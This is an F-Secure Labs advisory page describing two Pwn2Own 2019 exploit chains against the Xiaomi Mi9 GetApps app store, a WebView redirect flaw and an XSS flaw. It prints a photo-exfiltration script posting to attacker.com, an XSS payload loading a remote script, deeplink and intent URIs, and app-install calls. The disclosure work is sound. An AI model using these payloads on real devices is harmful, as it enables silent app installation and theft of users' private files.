<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="x-subsite-id" content="1" />

    <title>Xiaomi Mi9 (Pwn2Own 2019)</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/xiaomi-mi9/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="Xiaomi Mi9 (Pwn2Own 2019)">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/xiaomi-mi9/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="Xiaomi Mi9 (Pwn2Own 2019)">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/xiaomi-mi9/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type"></span>
      <h1>Xiaomi Mi9 (Pwn2Own 2019)</h1>
      
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>Xiaomi Mi9 </td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>High</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td>CVE-2020-9530, CVE-2020-9531</td>
          </tr>
          <tr>
            <td>Type</td>
            <td>RCE</td>
          </tr>
        </table>
        
        <h1>Description</h1><p>At mobile Pwn2Own 2019 F-Secure Labs successfully exploited the Xiaomi Mi9 using two different exploit chains. An attacker could use these to install applications and access sensitive information from a phone that either browsed to an attacker's website or scanned an NFC tag. Both chains exploited vulnerabilities in the Xiaomi market store 'GetApps' in order gain remote code execution by installing and launching a downloaded APK. The GetApps store is installed on Mi9 phones setup for the Chinese, Russian and several Asian markets. These two vulnerabilities were:</p><ol><li>CVE-2020-9530: A redirect vulnerability in a privileged WebView</li>
<li>CVE-2020-9531: An XSS vulnerability in locally stored web pages loaded into a privileged WebView</li>
</ol><h1>Technical Details</h1><h2>GetApps (com.xiaomi.mipicks)</h2><p>GetApps is an Xiaomi proprietary application store pre-installed on Xiaomi devices. The application is built using a number of local HTML files located in the application's sandbox and presented to the user using a WebView. This WebView has a number of interesting JavaScript Interfaces in order to provide app store functionality such as installing and launching apps. <br>This application can also be launched from the browser and have its WebView directed to an arbitrary URL. This is performed by a deeplink intent using the '<strong>mimarket</strong>' scheme and '<strong>browse</strong>' host name.</p><p>For example:</p><pre>mimarket://browse?url=https%3A%2F%2Fattacker.com&amp;title=Doom</pre><p>When the WebView first loads it checks that the target URL is either a trusted local HTML file in the application's sandbox or a hardcoded domain owned by Xiaomi. For external domains they must also use the HTTPS URL scheme.</p><p>The list of trusted domains are shown here:</p><p><img class="leftAlone" style="display: block; margin-left: auto; margin-right: auto;" title="" src="assets/Uploads/trusted.PNG" alt="trusted" width="465" height="143"></p><p>If the WebView tries to load an 'untrusted' URL it loads the page in a restricted WebView without the privileged JavaScript Interface. In order to gain access to this JavaScript interface, F-Secure exploited two different vulnerabilities in the GetApps application to bypass the security mechanisms.</p><h2>Browser Chain</h2><p>A high level overview of the chain used in Pwn2Own was:</p><ol><li><span>User selects a link from a web page, SMS message, or email which loads the attacker’s web site in the Xiaomi browser application</span></li>
<li>Launch Chrome via deeplink and auto-download a HTML file</li>
<li>Launch GetApps via a <strong>mimarket</strong> link and load an unsafe redirect on a trusted page</li>
<li>Render attacker controlled page in the GetApps trusted WebView</li>
<li>Install APK using a JavaScript Interface</li>
<li>Launch installed application using a JavaScript Interface</li>
<li>Launch SMS app with with an intent to render the downloaded file in its webview</li>
<li>Brute force filesystem names and exfiltrate photo </li>
</ol><h3>File Download and GetApps Launch</h3><p>For this chain we exfiltrate a file using a WebView in the SMS application which has access to the local file system. However the same origin policy applies and thus we must first download a html file to the local file system to be later rendered in the SMS application.</p><p>The Xiaomi browser always prompts for automatic downloads but the Chrome browser does not. So our first step in the chain is to redirect to Chrome and download a file.</p><p>The link for a launching Chrome from a browser is as follows:</p><pre>googlechrome://navigate?url=http://attacker.com/</pre><p>Once the attacker page is loaded into Chrome an auto download can be initiated by adding an iFrame where the content that is fetched has the header 'Content-Type' set to 'application/force-download', which will trigger a download rather than rendering it in the iFrame:</p><pre>var force = "http://attacker/force.html";
var iFrame = document.createElement("iframe");
iFrame.src = force;
document.body.appendChild(iFrame);</pre><p>To set the header we used a small Python web server:</p><pre>elif self.path=='/force.html':
    self.send_response(200)
    self.send_header('Content-type','application/force-download')
    self.end_headers()
    with open('force.html', 'rb') as f:
        self.wfile.write(f.read())
    return</pre><p>Once the file finished downloading the page was redirected to a <strong>mimarket</strong> link as already described to launch the GetApps application, loading a target URL on a trusted domain within the webview.</p><h3>Unsafe Redirect</h3><p>In order to subvert the security mechanism of preventing unsafe pages being loaded with access to the privileged market JavaScript interface we exploited a vulnerability in the way the WebView handled page redirects.<br><br> When a WebView is redirected to a different page it will call the method <strong>shouldOverrideUrlLoading()</strong> which checks if the redirect should take place. Although the URL is checked correctly when the WebView is first loaded no further checking was done on a redirect. A method was found on one of the trusted domains to automatically redirect to another website, including those outside of the trusted domains. Thus we were able to trigger a redirect to hijack the trusted WebView and access the privileged JavaScript Interfaces.</p><h3>Application Install and Launch</h3><p>Once we control the privileged GetApps WebView we can utilise a wide range of powerful interfaces that allow for a application store to function including the ability to install and launch applications. Installing an application can be done using<strong> market.install()</strong></p><pre>market.install(JSON.stringify({"callBack":"status","pName":"com.whatsapp"}))</pre><p>and once installed the application could be launched using <strong>market.openApp()</strong></p><pre>market.openApp(JSON.stringify({"pName":"com.whatsapp"}));</pre><p>At this point we can download and run any application, but we're not great app developers and didn't have time before Pwn2Own to get our app installed; instead we just continued the exploit chain to access sensitive information.</p><h3>Intent Proxy</h3><p>The SMS application was used to access the local file system. In order to launch the SMS application and have it load our HTML file in its privileged WebView we sent an intent to the action (com.android.mms.action.VIEW_WEB) of the .hybrid.SmsHybridActivity component of the SMS application. In order to do this we leveraged an arbitrary Intent Proxy that is accessible from a browser or WebView. The proxy is triggered using the <strong>mimarket</strong> scheme and <strong>launchordetail</strong> as the host, allowing an arbitrary intent URL to be constructed, HTML encoded and included in the URI parameter in the link. For example the following was used to launch the SMS application and render a downloaded HTML file in the SMS applications WebView:</p><pre>mimarket://launchordetail?id=com.android.mms&amp;uri=intent%3A%23Intent%3Baction%3Dcom.android.mms.action.VIEW_WEB%3Bcomponent%3Dcom.android.mms%2F.hybrid.SmsHybridActivity%3BS.url%3Dfile%253A%252F%252F%252Fsdcard%252FDownload%252Fforce.html%3Bend</pre><p>This intent proxy is a feature of the GetApp application and was not removed by Xiaomi after it was reported.</p><p><span style="font-family: FSecureSansHeadline, &#039;Arial Black&#039;, Arial, sans-serif; font-size: 1.5em;">File Exfiltration via SMS Application</span></p><p>The SMS WebView has access to the local file system via the <strong>file</strong> URL scheme however it is not able to list directory structures. Fortunately, the Xiaomi camera creates predictable file names for photos by appending the datetime to the nearest minute, for example:</p><pre>/sdcard/DCIM/Camera/IMG_20191102_102437.jpg</pre><p>To exfiltrate the image we brute forced all possible file names over a single day, sending the extracted data to our server. Image files were read by rendering the image in a canvas and accessing the image data using JavaScript. The exfiltration script for testing a path and extracting the data was as follows:</p><pre>async function getBase64FromImageUrl(url) {
    var img = new Image();
    img.setAttribute('crossOrigin', 'anonymous');
    img.onload = function () {
	var canvas = document.createElement("canvas");
	canvas.width =this.width;
	canvas.height =this.height;
	var ctx = canvas.getContext("2d");
	ctx.drawImage(this, 0, 0);
        var dataURL = canvas.toDataURL("image/png");
	var data = dataURL.replace(/^data:image\/(png|jpg);base64,/, "");
      	var xhttp = new XMLHttpRequest();
            xhttp.open("POST", "http://attacker.com/exfil", true);
	    xhttp.send(data);
        };
     img.src = url;
}</pre><h2>NFC Chain</h2><p><span>A high level overview of the chain used in Pwn2Own was:</span></p><ol><li>Phone scans a prepared NFC tag and launches the Xiaomi browser with a specific URL</li>
<li>Launch GetApps via a <strong>mimarket</strong> link and load a trusted local page with XSS payload in the arguments</li>
<li>XSS script creates a reverse JavaScript shell to our server</li>
<li>Enumerate file system to find photo</li>
<li>Exfiltrate photo</li>
<li>Install APK using a JavaScript Interface</li>
<li>Launch installed application using a JavaScript Interface</li>
</ol><h3>NFC NDEF</h3><p>An NFC tag can contain a number of NDEF records for exchanging information with a phone scanning it. A standard NDEF record is the URL record which lets the tag contain a target URL which when scanned can be loaded into a browser. However as the Xiaomi Mi9 has two browsers installed the application window is displayed rather than launching the target URL directly into the browser. However, Android devices also recognise a special NDEF record called "Android Application Record" (AAR) which allows for selecting and launching an application installed on the device.</p><p>If a tag is written to so it first contains a URL record and then an AAR record targeting a specific browser the application selection prompt is not displayed and the target URL is rendered in the browser. For our attack the NDEF records on our tag looked like this:</p><pre>Record 1: (URL) http://attacker.com<br>Record 2: (AAR) com.android.browser</pre><p><span style="font-family: FSecureSansHeadline, &#039;Arial Black&#039;, Arial, sans-serif; font-size: 1.5em;">XSS</span></p><p>Intents cannot be launched using the NFC tag, so an attacker webpage is loaded instead, which immediately launches the following <strong>mimarket</strong> browsable:</p><pre>mimarket://browse?title=aaa&amp;url=target</pre><p>This browsable opens the <strong>GetApps</strong> application, which as discussed above is implemented using a web view. The URL parameter is the HTML file to load within the web view, which must be stored within the application's local data. One of the accessible HTML files was found to have an XSS vulnerability whereby it includes HTML content from the URL within the file. The following browsable was used to open the HTML file including some injected HTML within the privileged <strong>GetApps</strong> web view:</p><pre class="Code">mimarket://browse?url=file://manual-upgrade.html?manualUpgradeInfo={"changeLog":"&lt;svg onload%3D\"javascript:j%3Ddocument.createElement('script');j.src%3D'http://10.42.0.1/pl.js';document.getElementsByTagName('head')[0].appendChild(j);\" xmlns%3D\"http://www.w3.org/2000/svg\"&gt;&lt;/svg&gt;"}&amp;title=butts</pre><p>This is the human-readable form; multiple levels of encoding are required to form a valid browsable intent. Using the injected HTML to redirect to a website would remove the enhanced privileges, so a JavaScript payload had to be downloaded and inserted into the current page.</p><h3>Post-exploitation</h3><p>The GetApps application has universal file access from the WebView as it is required by the application in order to perform normal market functionality. As we are running JavaScript in this context we can access the local file system with the <strong>file</strong> URL scheme.</p><p>While we could just steal a single photo we use a little spare time and drink to glitz it up a bit the night before the Pwn2Own contest. We put together a JavaScript reverse shell which executes commands from a C2 server and returns output to a terminal. During Pwn2Own this was used to browse the filesystem and download all pictures.</p><p>As the same WebView was used in the Browser chain, we used the same method for installing and then launching our app to gain code execution.</p><p> </p><h1><span style="font-size: 2em;">Remediation</span></h1><p>Both vulnerabilities were patched in GetApps version <span>2001122 [1]</span></p><p><span>1. <a href="https://sec.xiaomi.com/post/180">https://sec.xiaomi.com/post/180</a></span></p><p> </p>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/xiaomi-mi9/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/xiaomi-mi9/&text=Xiaomi Mi9 (Pwn2Own 2019)" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/xiaomi-mi9/&title=Xiaomi Mi9 (Pwn2Own 2019)" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/xiaomi-mi9/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
